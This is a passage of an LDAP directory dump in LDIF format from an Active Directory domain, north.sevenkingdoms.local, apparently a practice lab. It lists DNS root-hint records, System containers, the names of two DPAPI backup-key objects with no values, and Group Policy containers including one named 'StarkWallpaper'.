dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: e.root-servers.net

\# f.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=f.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=f.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12467  
uSNChanged: 12468  
showInAdvancedViewOnly: TRUE  
name: f.root-servers.net  
objectGUID:: UzRU2lOmH0ehnx1Wq/IAIg==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAAvAAAAAAAAAAAADw==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: f.root-servers.net

\# g.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=g.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=g.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12469  
uSNChanged: 12470  
showInAdvancedViewOnly: TRUE  
name: g.root-servers.net  
objectGUID:: Dxw1reG0yECUB+I63Gp0Ng==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAASAAAAAAAAAAANDQ==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: g.root-servers.net

\# h.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=h.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=h.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12471  
uSNChanged: 12472  
showInAdvancedViewOnly: TRUE  
name: h.root-servers.net  
objectGUID:: yC9xM/0Pq0OO4KTeQx1llQ==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAABAAAAAAAAAAAAUw==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: h.root-servers.net

\# i.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=i.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=i.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12473  
uSNChanged: 12474  
showInAdvancedViewOnly: TRUE  
name: i.root-servers.net  
objectGUID:: J0w6df+sAU+1KFzhUYeDAA==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEH/gAAAAAAAAAAAAAAUw==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: i.root-servers.net

\# j.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=j.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=j.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12475  
uSNChanged: 12476  
showInAdvancedViewOnly: TRUE  
name: j.root-servers.net  
objectGUID:: 1qsRYaeJFUCsuRowNcJBXQ==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAwwnAAAAAAAAAAIAMA==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: j.root-servers.net

\# k.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=k.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=k.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12477  
uSNChanged: 12478  
showInAdvancedViewOnly: TRUE  
name: k.root-servers.net  
objectGUID:: 9tFWApIomUGqixHsxy9u4g==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEH/QAAAAAAAAAAAAAAAQ==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: k.root-servers.net

\# l.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=l.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=l.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12479  
uSNChanged: 12480  
showInAdvancedViewOnly: TRUE  
name: l.root-servers.net  
objectGUID:: /6NVIDjaBE6IEq3Sydvt3A==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAACfAAAAAAAAAAAAQg==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: l.root-servers.net

\# m.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=m.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=m.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12481  
uSNChanged: 12482  
showInAdvancedViewOnly: TRUE  
name: m.root-servers.net  
objectGUID:: TalfAGjzfkeTelNRTXqZag==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAENwwAAAAAAAAAAAAAANQ==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: m.root-servers.net

\# BCKUPKEY\_f5c0ad65-d266-4faf-9088-0b48383e2290 Secret, System, north.sevenking  
 doms.local  
dn: CN=BCKUPKEY\_f5c0ad65-d266-4faf-9088-0b48383e2290 Secret,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local

\# BCKUPKEY\_PREFERRED Secret, System, north.sevenkingdoms.local  
dn: CN=BCKUPKEY\_PREFERRED Secret,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# WinsockServices, System, north.sevenkingdoms.local  
dn: CN=WinsockServices,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: WinsockServices  
distinguishedName: CN=WinsockServices,CN=System,DC=north,DC=sevenkingdoms,DC=l  
 ocal  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7765  
uSNChanged: 7765  
showInAdvancedViewOnly: TRUE  
name: WinsockServices  
objectGUID:: hefUTeZAp06C89ULd0/VhA==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# RpcServices, System, north.sevenkingdoms.local  
dn: CN=RpcServices,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
objectClass: rpcContainer  
cn: RpcServices  
distinguishedName: CN=RpcServices,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7766  
uSNChanged: 7766  
showInAdvancedViewOnly: TRUE  
name: RpcServices  
objectGUID:: W5bNBQSb2UiN7Kf/HE+Pyg==  
systemFlags: \-1946157056  
objectCategory: CN=Rpc-Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,D  
 C=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# FileLinks, System, north.sevenkingdoms.local  
dn: CN=FileLinks,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: fileLinkTracking  
cn: FileLinks  
distinguishedName: CN=FileLinks,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7767  
uSNChanged: 7767  
showInAdvancedViewOnly: TRUE  
name: FileLinks  
objectGUID:: 4DzIiYXH0EaGwAZvU35Ghg==  
systemFlags: \-1946157056  
objectCategory: CN=File-Link-Tracking,CN=Schema,CN=Configuration,DC=sevenkingd  
 oms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# VolumeTable, FileLinks, System, north.sevenkingdoms.local  
dn: CN=VolumeTable,CN=FileLinks,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# ObjectMoveTable, FileLinks, System, north.sevenkingdoms.local  
dn: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=north,DC=sevenkingdoms,DC=loc  
 al  
objectClass: top  
objectClass: fileLinkTracking  
objectClass: linkTrackObjectMoveTable  
cn: ObjectMoveTable  
distinguishedName: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=north,DC=seven  
 kingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7769  
uSNChanged: 7769  
showInAdvancedViewOnly: TRUE  
name: ObjectMoveTable  
objectGUID:: y61KwAIdKE6UpkzKACXiTw==  
systemFlags: \-1946157056  
objectCategory: CN=Link-Track-Object-Move-Table,CN=Schema,CN=Configuration,DC=  
 sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Default Domain Policy, System, north.sevenkingdoms.local  
dn: CN=Default Domain Policy,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: leaf  
objectClass: domainPolicy  
cn: Default Domain Policy  
distinguishedName: CN=Default Domain Policy,CN=System,DC=north,DC=sevenkingdom  
 s,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7770  
uSNChanged: 7770  
showInAdvancedViewOnly: TRUE  
name: Default Domain Policy  
objectGUID:: t9foeCXiFkSS4ecsYQWShw==  
objectCategory: CN=Domain-Policy,CN=Schema,CN=Configuration,DC=sevenkingdoms,D  
 C=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# AppCategories, Default Domain Policy, System, north.sevenkingdoms.local  
dn: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=north,DC=sevenkingd  
 oms,DC=local  
objectClass: top  
objectClass: classStore  
cn: AppCategories  
distinguishedName: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=nort  
 h,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7771  
uSNChanged: 7771  
showInAdvancedViewOnly: TRUE  
name: AppCategories  
objectGUID:: 4ZLbemlTCU2oqkUNZirFhg==  
objectCategory: CN=Class-Store,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=  
 local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Meetings, System, north.sevenkingdoms.local  
dn: CN=Meetings,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: Meetings  
distinguishedName: CN=Meetings,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7772  
uSNChanged: 7772  
showInAdvancedViewOnly: TRUE  
name: Meetings  
objectGUID:: QF3MBbBrTU23D2KgfQkSYQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Policies, System, north.sevenkingdoms.local  
dn: CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: Policies  
distinguishedName: CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7773  
uSNChanged: 7773  
showInAdvancedViewOnly: TRUE  
name: Policies  
objectGUID:: oBc3i/qIS0OgUqSkJywsgQ==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# {EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D}, Policies, System, north.sevenkingdoms  
 .local  
dn: CN={EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D},CN=Policies,CN=System,DC=north,D  
 C=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
objectClass: groupPolicyContainer  
cn: {EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D}  
distinguishedName: CN={EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D},CN=Policies,CN=Sy  
 stem,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413171436.0Z  
whenChanged: 20250413171436.0Z  
displayName: StarkWallpaper  
uSNCreated: 17099  
uSNChanged: 17111  
showInAdvancedViewOnly: TRUE  
name: {EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D}  
objectGUID:: Bx8BndAg3E2MGX4JEAYKGg==  
flags: 0  
versionNumber: 131073  
objectCategory: CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=sevenk  
 ingdoms,DC=local  
gPCFunctionalityVersion: 2  
gPCFileSysPath: \\\\north.sevenkingdoms.local\\SysVol\\north.sevenkingdoms.local\\P  
 olicies\\{EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D}  
gPCMachineExtensionNames: \[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-340  
 7-48AE-BA88-E8213C6761F1}\]  
gPCUserExtensionNames: \[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F73-3407-4  
 8AE-BA88-E8213C6761F1}\]  
dSCorePropagationData: 20250413171436.0Z  
dSCorePropagationData: 16010101000000.0Z

\# Machine, {EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D}, Policies, System, north.seve  
 nkingdoms.local  
dn: CN=Machine,CN={EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D},CN=Policies,CN=System  
 ,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: Machine  
distinguishedName: CN=Machine,CN={EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D},CN=Pol  
 icies,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413171436.0Z  
whenChanged: 20250413171436.0Z  
uSNCreated: 17100  
uSNChanged: 17100  
showInAdvancedViewOnly: TRUE  
name: Machine  
objectGUID:: v4E8NAOQCEqZ2msBS5z/DQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413171436.0Z  
dSCorePropagationData: 16010101000001.0Z

\# User, {EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D}, Policies, System, north.sevenki  
 ngdoms.local  
dn: CN=User,CN={EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D},CN=Policies,CN=System,DC  
 \=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: User  
distinguishedName: CN=User,CN={EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D},CN=Polici  
 es,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413171436.0Z  
whenChanged: 20250413171436.0Z  
uSNCreated: 17101  
uSNChanged: 17101  
showInAdvancedViewOnly: TRUE  
name: User  
objectGUID:: tx056QM93kCMtzoYTBD7/A==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413171436.0Z  
dSCorePropagationData: 16010101000001.0Z

\# {31B2F340-016D-11D2-945F-00C04FB984F9}, Policies, System, north.sevenkingdoms  
 .local  
dn: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=north,D  
 C=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
objectClass: groupPolicyContainer  
cn: {31B2F340-016D-11D2-945F-00C04FB984F9}  
distinguishedName: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Sy  
 stem,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413164310.0Z  
displayName: Default Domain Policy  
uSNCreated: 7774  
uSNChanged: 13104  
showInAdvancedViewOnly: TRUE  
name: {31B2F340-016D-11D2-945F-00C04FB984F9}  
objectGUID:: nVEGD85j/UaJRotVpb7nkg==  
flags: 0  
versionNumber: 2  
systemFlags: \-1946157056  
objectCategory: CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=sevenk  
 ingdoms,DC=local  
isCriticalSystemObject: TRUE  
gPCFunctionalityVersion: 2  
gPCFileSysPath: \\\\north.sevenkingdoms.local\\sysvol\\north.sevenkingdoms.local\\P  
 olicies\\{31B2F340-016D-11D2-945F-00C04FB984F9}  
gPCMachineExtensionNames: \[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4F  
 B-11D0-A0D0-00A0C90F574B}\]  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101000000.0Z

\# User, {31B2F340-016D-11D2-945F-00C04FB984F9}, Policies, System, north.sevenki  
 ngdoms.local  
dn: CN=User,CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC  
 \=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: User  
distinguishedName: CN=User,CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Polici  
 es,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7775  
uSNChanged: 7775  
showInAdvancedViewOnly: TRUE  
name: User  
objectGUID:: 3QgGkDXtYk+dsKS1aiTpSQ==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 16010101000000.0Z

\# Machine, {31B2F340-016D-11D2-945F-00C04FB984F9}, Policies, System, north.seve  
 nkingdoms.local  
dn: CN=Machine,CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System  
 ,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: Machine  
distinguishedName: CN=Machine,CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Pol  
 icies,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7776  
uSNChanged: 7776  
showInAdvancedViewOnly: TRUE  
name: Machine  
objectGUID:: rh5lVpCRtEmh8/M2Dw7ZPA==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 16010101000000.0Z

\# {6AC1786C-016F-11D2-945F-00C04fB984F9}, Policies, System, north.sevenkingdoms  
 .local  
dn: CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=north,D  
 C=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
objectClass: groupPolicyContainer  
cn: {6AC1786C-016F-11D2-945F-00C04fB984F9}  
distinguishedName: CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=Sy  
 stem,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
displayName: Default Domain Controllers Policy  
uSNCreated: 7777  
uSNChanged: 7777  
showInAdvancedViewOnly: TRUE  
name: {6AC1786C-016F-11D2-945F-00C04fB984F9}  
objectGUID:: oRE981Tcckinl7/bA8rd3g==  
flags: 0  
versionNumber: 1  
systemFlags: \-1946157056  
objectCategory: CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=sevenk  
 ingdoms,DC=local  
isCriticalSystemObject: TRUE  
gPCFunctionalityVersion: 2  
gPCFileSysPath: \\\\north.sevenkingdoms.local\\sysvol\\north.sevenkingdoms.local\\P  
 olicies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}  
gPCMachineExtensionNames: \[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4F  
 B-11D0-A0D0-00A0C90F574B}\]  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101000000.0Z

\# User, {6AC1786C-016F-11D2-945F-00C04fB984F9}, Policies, System, north.sevenki  
 ngdoms.local  
dn: CN=User,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC  
 \=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: User  
distinguishedName: CN=User,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Polici  
 es,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7778  
uSNChanged: 7778  
showInAdvancedViewOnly: TRUE  
name: User  
objectGUID:: bCQ3jsv5ikGwzFANDr7vpw==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 16010101000000.0Z

\# Machine, {6AC1786C-016F-11D2-945F-00C04fB984F9}, Policies, System, north.seve  
 nkingdoms.local  
dn: CN=Machine,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System  
 ,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: Machine  
distinguishedName: CN=Machine,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Pol  
 icies,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7779  
uSNChanged: 7779  
showInAdvancedViewOnly: TRUE  
name: Machine  
objectGUID:: noiuvoinOU6fkeReKaH8kw==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 16010101000000.0Z

\# RAS and IAS Servers Access Check, System, north.sevenkingdoms.local  
dn: CN=RAS and IAS Servers Access Check,CN=System,DC=north,DC=sevenkingdoms,DC  
 \=local  
objectClass: top  
objectClass: container  
cn: RAS and IAS Servers Access Check  
distinguishedName: CN=RAS and IAS Servers Access Check,CN=System,DC=north,DC=s  
 evenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7780  
uSNChanged: 7780  
showInAdvancedViewOnly: TRUE  
name: RAS and IAS Servers Access Check  
objectGUID:: EnWkAnNvDUOnit8grcKLRA==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# File Replication Service, System, north.sevenkingdoms.local  
dn: CN=File Replication Service,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: applicationSettings  
objectClass: nTFRSSettings  
cn: File Replication Service  
distinguishedName: CN=File Replication Service,CN=System,DC=north,DC=sevenking  
 doms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7781  
uSNChanged: 7781  
showInAdvancedViewOnly: TRUE  
name: File Replication Service  
objectGUID:: 0KNLs0HsQUmrjBhHmzrHGA==  
systemFlags: \-1946157056  
objectCategory: CN=NTFRS-Settings,CN=Schema,CN=Configuration,DC=sevenkingdoms,  
 DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Dfs-Configuration, System, north.sevenkingdoms.local  
dn: CN=Dfs-Configuration,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dfsConfiguration  
cn: Dfs-Configuration  
distinguishedName: CN=Dfs-Configuration,CN=System,DC=north,DC=sevenkingdoms,DC  
 \=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7782  
uSNChanged: 7782  
showInAdvancedViewOnly: FALSE  
name: Dfs-Configuration  
objectGUID:: fG0G4IAqwUSIfRdDyQIMEg==  
objectCategory: CN=Dfs-Configuration,CN=Schema,CN=Configuration,DC=sevenkingdo  
 ms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
